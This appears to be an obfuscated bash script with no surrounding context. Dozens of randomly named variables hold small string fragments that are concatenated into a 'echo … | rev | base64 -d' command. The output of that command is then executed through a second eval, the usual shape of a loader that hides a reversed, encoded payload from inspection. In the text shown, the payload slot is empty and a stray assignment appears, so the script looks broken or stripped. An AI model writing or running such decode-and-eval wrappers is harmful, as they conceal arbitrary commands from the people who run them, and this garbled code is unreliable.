AFKHJbDqsLyZsgoiWJVPzbMkmvGntGrABlCLIFlbYCjIfdbxQEZseBXyMNXRKtdwaGoCqnHYDidhDbeRZnqOdjdOkoiUWedwYyYC="USJhIzqpBfYrRFfWXTEmTMhuadMCmHCIqofXKsTqrdDYkbkcBWfSrhPNVaHGiEdfSNZnTKkiOFXBqoELtjpgPEUZhyPWtTsMKUKC";hIUZuNrxgiRKTNOXIeZNsySRlWOjbQwmHbYOlKhUMJhOzraYTytvGnwISYdHItMkXczUQUpraOsQmaVOvkePLQHigmbLhibSItlz="UsVjQKadDcAmlzXHUoyjQZdqkYakyjpOVvPiwriGAHpYyeahNGvIfAFDNIEGlRPYKxabkUwUkiqwtJjvpweKqkuGQwNolYjJoBxn";rJSLFIWryOqWvJLxvbeEBNtybJNVeJNkBEZJocxJZOHAyHikUQgrVXXgxPxgGFgWyxDPcaKJAasqRTgJoxtFXJxkgwKDWjMfboNg="ch";fhZyhrGVrLIOwKVKnfgWyVUiZnAmccPypXaZsOgpLABMloCWpfpNVjAmnzNompvLFcMlFIwcrTflGUDLEMuGbDtfHnvqWLkEvdvx="4";LZZWFofkdRDNuIBAEfqBvhCTUQCaSnFguroFVpMEbUALdczpprtPzmpkVZrtqPulqeVlTauGGWSOsXDKFLFuwwhpLUnbzVCtRVQD="";EoIagcqMnaDUwJtfhtwtlPnBPdOmUpwaNhyMMurZKUMUkcyGglJrpYxdNNYWfmutTPxLPAUNzCCvWDQicLXIgycoKFMlSdOmocgq="sgMerqaRbwOxdSRQSxSRRVesBhQjaMWWZvaTsbbUkdECRcPqicENbnjnagdqmVjMRbYZltmSRqJhQrMMzhNWLiiOBHbjvsqNtzoK";cTJDZxhhFyiKeyHwPeTqegruBTBoXNHXdEOTFUqYrzLXsKQhlEUmrrEiNCofxSdaHrixvddgcsIWmUWdPsZkLdwDhrDBbQgvUPKs="  | r";McwWRPhZYJwlrSTwbFrrUVNPdbEKvuznkJLFUYDUuFOveWwkbgbLymRYRjVVkRVKaowresRYmxFKrWMuxKqWFkaiOUDVLaOPoGDZ="HlIOBLKwlQFyytosQHTWejyArgMZNQeMVnWsRsRrxzfkrlvimeMKEXibnTvaMjrUFhBrZSFeziFjuHACeGtKaXbjVnvkwojnwCsf";WbUeDlLkRWBEkKWiBrMSjZWqSYemzbQGpJzsivOZwOwnOcJQQSEGquNIcFzlmeKyheOPIlFQmCToGMHBAwlUuYBZCAKfMqipJrSt="";zGyWtxqMYfAhNbtBHbNHmTBrMpNcLPENRJRJMSQcSjaYzMPLqwJwbBHhcDwnzwUMNoMQGaCJcTEhpvjGRKrNPeYBngsexoZeDRlg="as";eXwOLnqTtnVQFPtGJdVGnVyHWJwymvlXnFHodEjfQxILarHQqSnSEtHbRpqYNQfIgvEPcSEhaGPwVfXLDMPQmppJgpnkGuotuKKD="aVWNGuPrVriQZPsFvLoKhpPKiGWSJwRIpsXWcJSikVzMlfedcSCvSrSjIsFKXFzMwjYAaaBSMMetSqsnJIfyTHdQpCMbyYWyZasg";zKQTkUymuDIgdKUznbNqwlGobxcHdCiphvkbbVUEdbWgLEZavkqKTSZUypMGfRBYcakHHeFvMUvcViNbfadeZvQNFpGYjRghPCHU="exYMtqTOclVsowgYMczhkQMbavgUAOQpDYWJKpCJbyocVPIFrVgbCfqdLfMqlpIBQOIPUZeZmHvxBxBmdznhPeLRYvvKvijRuXfq";sxbPUbdWeaoqraJDbFhscGGtzNdAUHeTgqhaMIFAafunAmBnzwneTSHZJkyICNCCtxJcQtcEGwSIztYWEefSVppyzmTfQaMYanFc="o";USozReJxXikeMJfYsuciZdGhfBgMGmtbkurBgJmsgwWxcnejIlEHUuwTGyIPuwygFZwHYmHDUqjGwFxKsKSBNGqYMPrMQSbaNbKI="6";BIzHaWYHajyEsukWziQdxsUaaOAJeWCrALjFkZmDUMnMPVWlRfzNNwDorpOlcfIfmENeSliRAlenaIgFIDBlQqjQDZEWkPQAbhbs="WcTJWrfFtaLcEXdkLWTKCZfGOkLLWYkVjtiTCABwvCpUiovOEKtzUXiIVdupeoZwNuyiFKSIWjfoCImCnPIpgVotDKqNqZlPLXID";WCVeKHQmjyWGWKHxwlqqOvMsEZCfJtNfEFQIqsAWfhfanFuSULEsTJTptxWnHHrFYwQSBpjkXQXbZRwAmTOcckQyhmSgkwxOfsVW=" -d";dlkvDEYhWBJDOPiZmUFnIIaEqtoXBqntbtsGXFTAVxvmeXcYgHKIUgqRgJnObarDnkclhwefBfqvAIgvPWXeKsKKheQGIXdkOMyx="mgjtwTGQxZKVZdNIPmaAKyhJsLiXuEWcjOSJYiNPoqOSvxrbDgNMWcXtEOXiOKehmciWUGmVldoOmxsFAgiqZEdAVTTnpzcOpQgW";VvRLMyAHCLOcJJxiFfJSiDGAWtNhHtwfsJXJzztaHbtuIeGDWbPlkQqORKGRdNYpvfXypMkrpPAZfLCwJsSyiSbZalEGwtEOQGuF="";TaFUxgmEQJAHnwPkAOBvuZvtiqixYEYkLfjcBkmeNGnofplxTxnRxmDzrYqORvbrikMSzhqJszXfpDVNXtQWurcuNiOQLvqROBpJ="b";ECUfXgpYYQTydcHiSdHaLqvOFlIlBUnvJDyXqAaShAZuLJliWmycsiLorbfdssXdbnsXlhWUCkhWDSInorUwvaPWvhvdPoMoZhnF="e";oYCiNSNpgkcGIYalLGQLfVcrTskIYkKJfHZTSDTFIKiImHpZfhTSYUMvTOnwjwiAnryoPXzrHbvreNLbRrhOiWCFgFqkZBPQMtOD="v |";Tx=Eds;NbcsEInXMDVYtyTUlBmKUHJwROrqRToqAQltVgtZsSPOCxHdjOdGOrvgfyJFUgVNFvxhcjDKJleyjMCtjfplfjgMgfPeKtxoigaZ="";hTNxMHmrudKndnpgVxGVNhGrPyeQKxLptQCHuyFhAHhBfGmaxlpTiBhqgGNNeVjVMIJwuvAnOPlKBHnNyzjUmJHnkNDAnyplXrUm=$(eval "$WbUeDlLkRWBEkKWiBrMSjZWqSYemzbQGpJzsivOZwOwnOcJQQSEGquNIcFzlmeKyheOPIlFQmCToGMHBAwlUuYBZCAKfMqipJrSt$ECUfXgpYYQTydcHiSdHaLqvOFlIlBUnvJDyXqAaShAZuLJliWmycsiLorbfdssXdbnsXlhWUCkhWDSInorUwvaPWvhvdPoMoZhnF$rJSLFIWryOqWvJLxvbeEBNtybJNVeJNkBEZJocxJZOHAyHikUQgrVXXgxPxgGFgWyxDPcaKJAasqRTgJoxtFXJxkgwKDWjMfboNg$LZZWFofkdRDNuIBAEfqBvhCTUQCaSnFguroFVpMEbUALdczpprtPzmpkVZrtqPulqeVlTauGGWSOsXDKFLFuwwhpLUnbzVCtRVQD$sxbPUbdWeaoqraJDbFhscGGtzNdAUHeTgqhaMIFAafunAmBnzwneTSHZJkyICNCCtxJcQtcEGwSIztYWEefSVppyzmTfQaMYanFc$cTJDZxhhFyiKeyHwPeTqegruBTBoXNHXdEOTFUqYrzLXsKQhlEUmrrEiNCofxSdaHrixvddgcsIWmUWdPsZkLdwDhrDBbQgvUPKs$ECUfXgpYYQTydcHiSdHaLqvOFlIlBUnvJDyXqAaShAZuLJliWmycsiLorbfdssXdbnsXlhWUCkhWDSInorUwvaPWvhvdPoMoZhnF$oYCiNSNpgkcGIYalLGQLfVcrTskIYkKJfHZTSDTFIKiImHpZfhTSYUMvTOnwjwiAnryoPXzrHbvreNLbRrhOiWCFgFqkZBPQMtOD$WbUeDlLkRWBEkKWiBrMSjZWqSYemzbQGpJzsivOZwOwnOcJQQSEGquNIcFzlmeKyheOPIlFQmCToGMHBAwlUuYBZCAKfMqipJrSt$TaFUxgmEQJAHnwPkAOBvuZvtiqixYEYkLfjcBkmeNGnofplxTxnRxmDzrYqORvbrikMSzhqJszXfpDVNXtQWurcuNiOQLvqROBpJ$NbcsEInXMDVYtyTUlBmKUHJwROrqRToqAQltVgtZsSPOCxHdjOdGOrvgfyJFUgVNFvxhcjDKJleyjMCtjfplfjgMgfPeKtxoigaZ$zGyWtxqMYfAhNbtBHbNHmTBrMpNcLPENRJRJMSQcSjaYzMPLqwJwbBHhcDwnzwUMNoMQGaCJcTEhpvjGRKrNPeYBngsexoZeDRlg$ECUfXgpYYQTydcHiSdHaLqvOFlIlBUnvJDyXqAaShAZuLJliWmycsiLorbfdssXdbnsXlhWUCkhWDSInorUwvaPWvhvdPoMoZhnF$USozReJxXikeMJfYsuciZdGhfBgMGmtbkurBgJmsgwWxcnejIlEHUuwTGyIPuwygFZwHYmHDUqjGwFxKsKSBNGqYMPrMQSbaNbKI$LZZWFofkdRDNuIBAEfqBvhCTUQCaSnFguroFVpMEbUALdczpprtPzmpkVZrtqPulqeVlTauGGWSOsXDKFLFuwwhpLUnbzVCtRVQD$fhZyhrGVrLIOwKVKnfgWyVUiZnAmccPypXaZsOgpLABMloCWpfpNVjAmnzNompvLFcMlFIwcrTflGUDLEMuGbDtfHnvqWLkEvdvx$WCVeKHQmjyWGWKHxwlqqOvMsEZCfJtNfEFQIqsAWfhfanFuSULEsTJTptxWnHHrFYwQSBpjkXQXbZRwAmTOcckQyhmSgkwxOfsVW$NbcsEInXMDVYtyTUlBmKUHJwROrqRToqAQltVgtZsSPOCxHdjOdGOrvgfyJFUgVNFvxhcjDKJleyjMCtjfplfjgMgfPeKtxoigaZ");eval "$VvRLMyAHCLOcJJxiFfJSiDGAWtNhHtwfsJXJzztaHbtuIeGDWbPlkQqORKGRdNYpvfXypMkrpPAZfLCwJsSyiSbZalEGwtEOQGuF$hTNxMHmrudKndnpgVxGVNhGrPyeQKxLptQCHuyFhAHhBfGmaxlpTiBhqgGNNeVjVMIJwuvAnOPlKBHnNyzjUmJHnkNDAnyplXrUm$WbUeDlLkRWBEkKWiBrMSjZWqSYemzbQGpJzsivOZwOwnOcJQQSEGquNIcFzlmeKyheOPIlFQmCToGMHBAwlUuYBZCAKfMqipJrSt$LZZWFofkdRDNuIBAEfqBvhCTUQCaSnFguroFVpMEbUALdczpprtPzmpkVZrtqPulqeVlTauGGWSOsXDKFLFuwwhpLUnbzVCtRVQD"